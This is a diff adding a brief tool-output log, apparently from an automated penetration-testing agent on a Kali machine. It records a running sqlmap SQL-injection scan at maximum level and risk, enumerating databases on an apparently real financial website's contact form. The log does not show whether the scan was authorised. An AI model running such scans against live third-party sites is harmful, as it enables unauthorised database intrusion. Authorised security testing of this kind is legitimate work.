@@ -1,0 +1,11 @@
+# command: cd "$WORK_PATH"; ls -la tool_outputs/sqlmap_contact.log tool_outputs/sqlmap_root.log 2>&1 | cat; echo ---; pgrep -af "contact\?cb" | grep -v defunct | head -3; echo ---; find / -name 'oob_registry*' -maxdepth 4 2>/dev/null | head
+# tool: ls
+# exit_code: 0
+# ts: 2026-09-30T11:31:54.638963+00:00
+# ---
+
+-rw-r--r-- 1 kali kali 3096 Sep 30 11:26 tool_outputs/sqlmap_contact.log
+-rw-r--r-- 1 kali kali 3098 Sep 30 11:26 tool_outputs/sqlmap_root.log
+---
+246330 /usr/bin/python3 /usr/bin/sqlmap -u https://www.infinitycapital.bh/contact?cb=1&q=test&x=1 -p cb,q,x --batch --level=5 --risk=3 --dbs --threads=2 --timeout=15 --retries=1 --output-dir=tool_outputs/sqc
+---
